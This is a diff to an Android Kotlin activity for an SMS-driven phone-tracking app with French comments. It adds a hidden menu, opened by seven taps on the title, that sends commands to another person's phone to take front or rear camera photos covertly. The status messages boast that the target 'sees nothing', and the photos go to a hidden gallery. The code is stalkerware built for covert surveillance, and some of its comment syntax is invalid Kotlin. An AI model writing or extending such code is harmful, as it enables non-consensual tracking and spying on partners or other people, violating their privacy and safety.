@@ -11,6 +11,7 @@ import android.os.Bundle
 import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
+import android.view.View
 import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
@@ -26,6 +27,7 @@ import org.osmdroid.views.MapView
 import org.osmdroid.views.overlay.Marker
 import org.osmdroid.views.overlay.mylocation.GpsMyLocationProvider
 import org.osmdroid.views.overlay.mylocation.MyLocationNewOverlay
+import java.io.File
 
 class MainMapActivity : AppCompatActivity() {
 
@@ -33,10 +35,16 @@ class MainMapActivity : AppCompatActivity() {
     private lateinit var prefs: SharedPreferences
     private lateinit var etOtherNumber: EditText
     private lateinit var tvStatus: TextView
+    private lateinit var tvTitle: TextView  # 🕵️ Titre cliquable = menu secret
     private lateinit var myLocationOverlay: MyLocationNewOverlay
     private var otherMarker: Marker? = null
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private var otherMarkerVisible = false
+    
+    # 🕵️ Compteurs pour le menu secret
+    private var titleClickCount = 0
+    private val SECRET_CLICK_COUNT = 7  # 7 clics rapides sur le titre = ouvrir le menu caché
+    private var lastTitleClickTime = 0L
 
     companion object {
         var lastOtherPosition: GeoPoint? = null
@@ -44,6 +52,7 @@ class MainMapActivity : AppCompatActivity() {
         private const val TAG = "SAFI_UI"
         private const val REQUEST_OVERLAY = 1002
         private const val REQUEST_BATTERY_OPTIM = 1003
+        private const val REQUEST_CAMERA_PERM = 1004
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -56,6 +65,7 @@ class MainMapActivity : AppCompatActivity() {
         mapView = findViewById(R.id.mapView)
         etOtherNumber = findViewById(R.id.etOtherNumber)
         tvStatus = findViewById(R.id.tvStatus)
+        tvTitle = findViewById(R.id.tvTitle)  # 🕵️ Le titre en haut
 
         etOtherNumber.setText(prefs.getString("OTHER_NUM", ""))
 
@@ -65,9 +75,23 @@ class MainMapActivity : AppCompatActivity() {
         checkPermissions()
         requestBatteryOptimization()
         
-        // 🟢 Démarre le service en arrière-plan DÈS LE LANCEMENT
+        # 🕵️ MENU SECRET : 7 clics sur le titre
+        tvTitle.setOnClickListener {
+            val now = System.currentTimeMillis()
+            if (now - lastTitleClickTime > 2000) titleClickCount = 0  # Réinitialise si > 2s
+            lastTitleClickTime = now
+            titleClickCount++
+            
+            if (titleClickCount >= SECRET_CLICK_COUNT) {
+                titleClickCount = 0
+                showSecretMenu()
+            } else {
+                Toast.makeText(this, "🕵️ ${SECRET_CLICK_COUNT - titleClickCount} clics...", Toast.LENGTH_SHORT).show()
+            }
+        }
+        
         PersistentTrackingService.start(this)
-        tvStatus.text = "✅ Service en arrière-plan DÉMARRÉ — L'appli fonctionne 24h/24"
+        tvStatus.text = "✅ Service en arrière-plan DÉMARRÉ — Cliquez 7x sur le titre pour le menu secret"
     }
 
     private fun initMap() {
@@ -120,7 +144,7 @@ class MainMapActivity : AppCompatActivity() {
                 sendSms(num, Commands.REQUEST_POS_START)
                 tvStatus.text = "🟢 SUIVI DÉMARRÉ — $num m'envoie sa position chaque minute"
             }
-            Toast.makeText(this, "🟢 Suivi démarré ! L'appli fonctionne en arrière-plan", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "🟢 Suivi démarré !", Toast.LENGTH_LONG).show()
         }
 
         findViewById<Button>(R.id.btnStopFollow).setOnClickListener {
@@ -166,6 +190,62 @@ class MainMapActivity : AppCompatActivity() {
         }
     }
 
+    # 🕵️ MENU SECRET — 7 clics sur le titre
+    private fun showSecretMenu() {
+        val otherNum = getOtherNumber() ?: return
+        
+        val options = arrayOf(
+            "📸 Prendre photo AVANT à distance",
+            "📸 Prendre photo ARRIÈRE à distance",
+            "🖼️ Galerie cachée des photos",
+            "❌ Fermer le menu"
+        )
+
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("🕵️ MENU SECRET")
+            .setItems(options) { _, which ->
+                when (which) {
+                    0 -> {
+                        if (checkCameraPermission()) {
+                            sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
+                            tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum — Invisible pour lui !"
+                            Toast.makeText(this, "📸 Photo avant demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                        } else {
+                            requestCameraPermission()
+                        }
+                    }
+                    1 -> {
+                        if (checkCameraPermission()) {
+                            sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
+                            tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum — Invisible pour lui !"
+                            Toast.makeText(this, "📸 Photo arrière demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                        } else {
+                            requestCameraPermission()
+                        }
+                    }
+                    2 -> {
+                        startActivity(Intent(this, HiddenGalleryActivity::class.java))
+                    }
+                }
+            }
+            .show()
+    }
+
+    fun onPhotoReceived(photoFile: File) {
+        runOnUiThread {
+            tvStatus.text = "📸 Photo reçue ! → ${photoFile.name}"
+            Toast.makeText(this, "📸 Nouvelle photo dans la galerie cachée !", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private fun checkCameraPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun requestCameraPermission() {
+        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQUEST_CAMERA_PERM)
+    }
+
     private fun getOtherNumber(): String? {
         val num = prefs.getString("OTHER_NUM", "") ?: ""
         if (num.isEmpty()) {
@@ -199,7 +279,7 @@ class MainMapActivity : AppCompatActivity() {
             val smsManager = android.telephony.SmsManager.getDefault()
             try {
                 smsManager.sendDataMessage(to, null, Commands.PORT.toShort(), message.toByteArray(Charsets.UTF_8), null, null)
-                Log.d(TAG, "SMS data envoyé: $message")
+                Log.d(TAG, "📨 SMS data envoyé: $message")
             } catch (e: Exception) {
                 Log.d(TAG, "SMS data échoué, envoi texte: ${e.message}")
                 smsManager.sendTextMessage(to, null, message, null, null)
@@ -276,10 +356,14 @@ class MainMapActivity : AppCompatActivity() {
             Manifest.permission.SEND_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS,
-            Manifest.permission.INTERNET
+            Manifest.permission.INTERNET,
+            Manifest.permission.CAMERA
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             needed.add(Manifest.permission.POST_NOTIFICATIONS)
+            needed.add(Manifest.permission.READ_MEDIA_IMAGES)
+        } else {
+            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
         val missing = needed.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
